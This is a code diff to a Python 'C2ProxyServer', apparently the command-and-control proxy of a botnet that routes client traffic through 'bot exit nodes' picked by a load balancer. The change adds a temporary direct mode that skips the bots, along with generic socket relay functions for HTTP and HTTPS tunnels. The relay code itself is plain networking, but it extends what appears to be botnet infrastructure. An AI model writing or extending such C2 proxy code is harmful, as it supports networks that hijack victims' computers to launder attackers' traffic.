@@ -44,6 +44,10 @@ class C2ProxyServer:
             'start_time': datetime.now()
         }
         
+        # Temporary: enable direct forward mode to validate proxy quickly
+        # When True, C2 will directly connect to targets instead of via bots
+        self.direct_mode = True
+        
         # Server sockets
         self.c2_socket = None
         self.proxy_socket = None
@@ -479,7 +483,14 @@ class C2ProxyServer:
                 client_socket.send(b"HTTP/1.1 400 Bad Request\r\n\r\n")
                 return
                 
-            # Chọn bot exit node
+            # If direct mode is enabled, bypass bots and relay directly
+            if self.direct_mode:
+                print(f"🔧 Direct mode enabled - relaying directly to {target_host}:{target_port}")
+                self.direct_proxy_relay(client_socket, request_data, target_host, target_port, is_https)
+                self.stats['total_requests'] += 1
+                return
+            
+            # Otherwise choose bot exit node
             selected_bot = self.load_balancer.select_bot(self.bot_exit_nodes, strategy=self.load_balancing_strategy)
             if not selected_bot:
                 print(f"❌ No available exit nodes for proxy request from {client_addr}")
@@ -516,6 +527,69 @@ class C2ProxyServer:
         finally:
             if connection_id in self.active_proxy_connections:
                 self.cleanup_proxy_connection(connection_id)
+
+    def direct_proxy_relay(self, client_socket, initial_request, target_host, target_port, is_https):
+        """Relays traffic directly between client and target. For HTTPS (CONNECT), establishes a tunnel."""
+        try:
+            target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            target_sock.settimeout(10)
+            target_sock.connect((target_host, target_port))
+            target_sock.settimeout(None)
+            
+            if is_https:
+                # Respond 200 to establish tunnel
+                try:
+                    client_socket.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
+                except Exception:
+                    target_sock.close()
+                    return
+                # After CONNECT, start bidirectional relay
+                self._relay_bidirectional(client_socket, target_sock)
+            else:
+                # HTTP: forward initial request then relay responses
+                try:
+                    target_sock.sendall(initial_request)
+                except Exception:
+                    target_sock.close()
+                    return
+                # Relay target->client and client->target (in case of subsequent requests)
+                self._relay_bidirectional(client_socket, target_sock)
+        except Exception as e:
+            try:
+                client_socket.sendall(b"HTTP/1.1 502 Bad Gateway\r\n\r\n")
+            except Exception:
+                pass
+            print(f"❌ Direct relay error: {e}")
+        finally:
+            try:
+                client_socket.shutdown(socket.SHUT_RDWR)
+            except Exception:
+                pass
+            try:
+                client_socket.close()
+            except Exception:
+                pass
+
+    def _relay_bidirectional(self, sock_a, sock_b):
+        """Bidirectional relay between two sockets until either closes."""
+        def pump(src, dst):
+            try:
+                while True:
+                    data = src.recv(4096)
+                    if not data:
+                        break
+                    dst.sendall(data)
+            except Exception:
+                pass
+            finally:
+                try:
+                    dst.shutdown(socket.SHUT_WR)
+                except Exception:
+                    pass
+        t1 = threading.Thread(target=pump, args=(sock_a, sock_b), daemon=True)
+        t2 = threading.Thread(target=pump, args=(sock_b, sock_a), daemon=True)
+        t1.start(); t2.start()
+        t1.join(); t2.join()
                 
     def parse_http_request(self, request_str):
         """Parse HTTP request để lấy target host và port"""
